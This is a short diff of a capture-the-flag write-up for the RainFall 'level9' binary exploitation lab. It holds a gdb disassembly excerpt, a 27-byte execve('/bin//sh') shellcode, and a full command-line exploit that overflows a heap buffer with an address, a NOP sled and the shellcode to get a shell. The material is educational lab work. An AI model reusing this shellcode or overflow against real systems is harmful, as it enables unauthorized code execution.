@@ -69,7 +69,6 @@ Dump of assembler code for function _ZN1NC2Ei:
    0x080486f7 <+1>:     mov    %esp,%ebp
    0x080486f9 <+3>:     mov    0x8(%ebp),%eax
    0x080486fc <+6>:     movl   $0x8048848,(%eax)
-
    0x08048702 <+12>:    mov    0x8(%ebp),%eax
    0x08048705 <+15>:    mov    0xc(%ebp),%edx
    0x08048708 <+18>:    mov    %edx,0x68(%eax)
@@ -163,7 +162,7 @@ End of assembler dump.
 $ echo -ne "\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80" | wc -c
 27
 ```
-> BUFFER_SIZE( 108 ) - SHELLCODE_SIZE( 27 ) - ADDRESS_SIZE( 4 ) = 77
+>BUFFER_SIZE( 108 ) - SHELLCODE_SIZE( 27 ) - ADDRESS_SIZE( 4 ) = 77
 ```
 level9@RainFall:~$ ./level9 $(python -c "print('\x10\xa0\x04\x08' + '\x90'*77 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + '\x0c\xa0\x04\x08')")
 $ whoami
